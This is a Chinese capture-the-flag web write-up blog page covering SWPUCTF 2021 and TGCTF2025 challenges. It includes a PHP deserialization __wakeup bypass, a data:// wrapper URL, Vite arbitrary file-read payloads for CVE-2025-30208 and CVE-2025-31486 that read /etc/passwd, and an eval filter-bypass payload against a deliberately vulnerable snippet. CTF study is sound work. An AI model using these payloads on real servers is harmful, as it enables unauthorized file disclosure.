@@ -1,0 +1,204 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Morii的小站 | Morii的小站</title><meta name="author" content="Morii"><meta name="copyright" content="Morii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="NSSCTF1,[SWPUCTF 2021 新生赛]ez_unserialize 通过dirsearch扫描到了robots.txt ![image-20250202132925329](web wp.assets&#x2F;image-20250202132925329.png) 接着访问&#x2F;cl45s.php ![image-20250202133001050](web wp.asse">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Morii的小站">
+<meta property="og:url" content="http://example.com/2025/06/14/web%20wp/index.html">
+<meta property="og:site_name" content="Morii的小站">
+<meta property="og:description" content="NSSCTF1,[SWPUCTF 2021 新生赛]ez_unserialize 通过dirsearch扫描到了robots.txt ![image-20250202132925329](web wp.assets&#x2F;image-20250202132925329.png) 接着访问&#x2F;cl45s.php ![image-20250202133001050](web wp.asse">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/butterfly-icon.png">
+<meta property="article:published_time" content="2025-06-14T10:53:20.753Z">
+<meta property="article:modified_time" content="2025-04-15T12:18:57.849Z">
+<meta property="article:author" content="Morii">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "",
+  "url": "http://example.com/2025/06/14/web%20wp/",
+  "image": "http://example.com/img/butterfly-icon.png",
+  "datePublished": "2025-06-14T10:53:20.753Z",
+  "dateModified": "2025-04-15T12:18:57.849Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Morii",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/06/14/web%20wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Morii的小站',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Morii的小站</span></a><a class="nav-page-title" href="/"><span class="site-name">Morii的小站</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">无标题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-14T10:53:20.753Z" title="发表于 2025-06-14 18:53:20">2025-06-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-15T12:18:57.849Z" title="更新于 2025-04-15 20:18:57">2025-04-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="NSSCTF"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h2><h3 id="1-SWPUCTF-2021-新生赛-ez-unserialize"><a href="#1-SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="1,[SWPUCTF 2021 新生赛]ez_unserialize"></a>1,[SWPUCTF 2021 新生赛]ez_unserialize</h3><p><img src="C:\Users\Morii\AppData\Roaming\Typora\typora-user-images\image-20250202132749295.png" alt="image-20250202132749295"></p>
+<p>通过dirsearch扫描到了robots.txt</p>
+<p>![image-20250202132925329](web wp.assets&#x2F;image-20250202132925329.png)</p>
+<p>接着访问&#x2F;cl45s.php</p>
+<p>![image-20250202133001050](web wp.assets&#x2F;image-20250202133001050.png)</p>
+<p>利用ai进行反序列化脚本的编写</p>
+<p>![image-20250202133654882](web wp.assets&#x2F;image-20250202133654882.png)</p>
+<p>![image-20250202133851489](web wp.assets&#x2F;image-20250202133851489.png)</p>
+<h3 id="2-SWPUCTF-2021-新生赛-no-wakeup"><a href="#2-SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="2,[SWPUCTF 2021 新生赛]no_wakeup"></a>2,[SWPUCTF 2021 新生赛]no_wakeup</h3><p>点击问号处跳转到class.php页面</p>
+<p>![image-20250202134842762](web wp.assets&#x2F;image-20250202134842762.png)</p>
+<p>![image-20250202140335248](web wp.assets&#x2F;image-20250202140335248.png)</p>
+<p>通过ai进行审计</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">1. 理解代码逻辑</span><br><span class="line">    目标：通过反序列化修改$admin和$passwd的值，使其满足$admin === &quot;admin&quot;和$passwd === &quot;wllm&quot;，从而触发include(&quot;flag.php&quot;)并输出$flag。</span><br><span class="line">    问题：__wakeup方法会在反序列化时自动调用，将$passwd的值改为其SHA1哈希值，导致我们无法直接控制$passwd的值。</span><br><span class="line">    绕过方法：通过修改序列化字符串中的对象属性数量，使__wakeup方法不被调用。</span><br><span class="line">2. 绕过__wakeup的方法</span><br><span class="line">PHP反序列化时，如果序列化字符串中声明的对象属性数量大于实际属性数量，__wakeup方法将不会被调用。我们可以利用这一特性绕过__wakeup。</span><br><span class="line">3. 构造序列化字符串</span><br><span class="line">我们需要构造一个序列化字符串，使得反序列化后的对象满足以下条件：</span><br><span class="line">    $admin = &quot;admin&quot;</span><br><span class="line"></span><br><span class="line">    $passwd = &quot;wllm&quot;</span><br><span class="line">3.1 创建对象</span><br><span class="line">首先，创建一个HaHaHa类的对象，并修改其属性：</span><br><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">class HaHaHa&#123;</span><br><span class="line">    public $admin;</span><br><span class="line">    public $passwd;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new HaHaHa();</span><br><span class="line">$obj-&gt;admin = &quot;admin&quot;;</span><br><span class="line">$obj-&gt;passwd = &quot;wllm&quot;;</span><br><span class="line">3.2 序列化对象</span><br><span class="line">使用serialize()函数将对象序列化为字符串：</span><br><span class="line">php</span><br><span class="line">$serialized = serialize($obj);</span><br><span class="line">echo $serialized;</span><br><span class="line">运行上述代码，输出序列化字符串：</span><br><span class="line">O:6:&quot;HaHaHa&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</span><br><span class="line">3.3 修改属性数量</span><br><span class="line">将序列化字符串中的属性数量从2改为一个更大的值（例如3）：</span><br><span class="line">O:6:&quot;HaHaHa&quot;:3:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>![image-20250202135102745](web wp.assets&#x2F;image-20250202135102745.png)</p>
+<h3 id="3，-SWPUCTF-2021-新生赛-PseudoProtocols"><a href="#3，-SWPUCTF-2021-新生赛-PseudoProtocols" class="headerlink" title="3，[SWPUCTF 2021 新生赛]PseudoProtocols"></a>3，[SWPUCTF 2021 新生赛]PseudoProtocols</h3><p>![image-20250202140609055](web wp.assets&#x2F;image-20250202140609055.png)</p>
+<p>发现了hint.php，根据题目提示进行PHP伪协议进行读取</p>
+<p>![image-20250202140720398](web wp.assets&#x2F;image-20250202140720398.png)</p>
+<p>发现了base64编码的内容，进行解码</p>
+<p>![image-20250202140741420](web wp.assets&#x2F;image-20250202140741420.png)</p>
+<p>接着访问&#x2F;test2222222222222.php</p>
+<p>![image-20250202140827500](web wp.assets&#x2F;image-20250202140827500.png)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node7.anna.nssctf.cn:24188/test2222222222222.php?a=data://text/plain,I want flag</span><br></pre></td></tr></table></figure>
+
+<p>![image-20250202141120654](web wp.assets&#x2F;image-20250202141120654.png)</p>
+<h2 id="TGCTF2025"><a href="#TGCTF2025" class="headerlink" title="TGCTF2025"></a>TGCTF2025</h2><h3 id="前端GAME"><a href="#前端GAME" class="headerlink" title="前端GAME"></a>前端GAME</h3><p>CVE-2025-30208 Vite开发服务器任意文件读取漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞源于Vite在处理URL查询参数时的逻辑缺陷。当请求路径包含特定参数（如`?raw??`或`?import&amp;raw??`）时，Vite对URL尾部分隔符（如`?`和`&amp;`）的正则匹配不严格，导致安全检查被绕过。例如，攻击者可构造类似`/@fs/etc/passwd?raw??`的请求，利用`@fs`机制（本用于访问项目允许列表内的文件）读取系统敏感文件官方修复方案通过正则表达式`/[?&amp;]+$/`移除URL末尾的冗余分隔符，从而阻断绕过路径</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Linux示例</span><br><span class="line">http://目标IP:端口/@fs/etc/passwd?raw??</span><br><span class="line"></span><br><span class="line"># Windows示例</span><br><span class="line">http://目标IP:端口/@fs/c://windows/win.ini?import&amp;raw??</span><br></pre></td></tr></table></figure>
+
+<p>![image-20250415185150939](web wp.assets&#x2F;image-20250415185150939.png)</p>
+<p>提示flag在根目录下&#x2F;tgflagggg中，根据cve漏洞的提示，访问&#x2F;@fc&#x2F;tgflagggg</p>
+<p>![image-20250415185832611](web wp.assets&#x2F;image-20250415185832611.png)</p>
+<p>![image-20250415185851182](web wp.assets&#x2F;image-20250415185851182.png)</p>
+<h3 id="前端GAME-Plus"><a href="#前端GAME-Plus" class="headerlink" title="前端GAME Plus"></a>前端GAME Plus</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">复现wp</span><br><span class="line">CVE-2025-31486 </span><br><span class="line">https://mp.weixin.qq.com/s?__biz=MzkyMTcwNjg4Mw==&amp;mid=2247483811&amp;idx=1&amp;sn=2b4403023fd911f611bf5590ea3796d6&amp;scene=21#wechat_redirect</span><br><span class="line">payload</span><br><span class="line">/etc/passwd1 svg1 wasm?init</span><br><span class="line">/tgflagggg1 svg1 wasm?init</span><br></pre></td></tr></table></figure>
+
+<p>![image-20250415191229741](web wp.assets&#x2F;image-20250415191229741.png)</p>
+<h3 id="AAA偷渡阴平"><a href="#AAA偷渡阴平" class="headerlink" title="AAA偷渡阴平"></a>AAA偷渡阴平</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$tgctf2025=$_GET[&#x27;tgctf2025&#x27;];</span><br><span class="line"></span><br><span class="line">if(!preg_match(&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $tgctf2025))&#123;</span><br><span class="line">    //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span><br><span class="line">    eval($tgctf2025);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__); </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">分步解释</span><br><span class="line"></span><br><span class="line">    获取根目录路径</span><br><span class="line">    dirname(sys_get_temp_dir()) → 返回 /（根目录）。</span><br><span class="line"></span><br><span class="line">    列出根目录文件</span><br><span class="line">    scandir(...) → 返回数组 [&quot;.&quot;, &quot;..&quot;, &quot;bin&quot;, &quot;dev&quot;, &quot;etc&quot;, &quot;flag&quot;, ...]。</span><br><span class="line"></span><br><span class="line">    移动数组指针</span><br><span class="line"></span><br><span class="line">        第1次 next() → ..（索引1）</span><br><span class="line"></span><br><span class="line">        第2次 next() → bin（索引2）</span><br><span class="line"></span><br><span class="line">        第3次 next() → dev（索引3）</span><br><span class="line"></span><br><span class="line">        第4次 next() → etc（索引4）</span><br><span class="line"></span><br><span class="line">        第5次 next() → flag（索引5）</span><br><span class="line"></span><br><span class="line">    读取文件内容</span><br><span class="line">    readfile() 输出flag文件内容。</span><br><span class="line"></span><br><span class="line">备选方案（直接定位文件名）</span><br><span class="line"></span><br><span class="line">若文件名已知为 flag，可简化操作：</span><br><span class="line">php</span><br><span class="line">复制</span><br><span class="line"></span><br><span class="line">?tgctf2025=readfile(flag);</span><br><span class="line"></span><br><span class="line">前提条件：通过切换工作目录到根目录确保路径正确：</span><br><span class="line">php</span><br><span class="line">复制</span><br><span class="line"></span><br><span class="line">?tgctf2025=chdir(dirname(sys_get_temp_dir()));readfile(flag);</span><br><span class="line"></span><br><span class="line">关键绕过技术</span><br><span class="line"></span><br><span class="line">    动态路径生成</span><br><span class="line">    使用 sys_get_temp_dir() + dirname() 生成根目录路径，绕过斜杠过滤。</span><br><span class="line"></span><br><span class="line">    无索引数组遍历</span><br><span class="line">    通过连续调用 next() 移动指针，避免硬编码索引。</span><br><span class="line"></span><br><span class="line">    符号过滤绕过</span><br><span class="line">    全程仅使用英文括号 () 和未被过滤的函数名，完全匹配正则规则。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?tgctf2025=chdir(dirname(sys_get_temp_dir()));readfile(flag);</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Morii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/06/14/web%20wp/">http://example.com/2025/06/14/web%20wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Morii的小站</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/06/06/hello-world/" title="Hello World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;  More info: Writing Run server1$ hexo server  More info: Server Generate static files1$ hexo generate  More info: Generating Deploy to remote sites1$ hexo deploy  More info: Deployment </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Morii</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSCTF"><span class="toc-number">1.</span> <span class="toc-text">NSSCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize"><span class="toc-number">1.1.</span> <span class="toc-text">1,[SWPUCTF 2021 新生赛]ez_unserialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup"><span class="toc-number">1.2.</span> <span class="toc-text">2,[SWPUCTF 2021 新生赛]no_wakeup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%8C-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols"><span class="toc-number">1.3.</span> <span class="toc-text">3，[SWPUCTF 2021 新生赛]PseudoProtocols</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TGCTF2025"><span class="toc-number">2.</span> <span class="toc-text">TGCTF2025</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFGAME"><span class="toc-number">2.1.</span> <span class="toc-text">前端GAME</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFGAME-Plus"><span class="toc-number">2.2.</span> <span class="toc-text">前端GAME Plus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AAA%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3"><span class="toc-number">2.3.</span> <span class="toc-text">AAA偷渡阴平</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/14/web%20wp/" title="无标题">无标题</a><time datetime="2025-06-14T10:53:20.753Z" title="发表于 2025-06-14 18:53:20">2025-06-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/06/hello-world/" title="Hello World">Hello World</a><time datetime="2025-06-06T00:21:22.250Z" title="发表于 2025-06-06 08:21:22">2025-06-06</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Morii</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
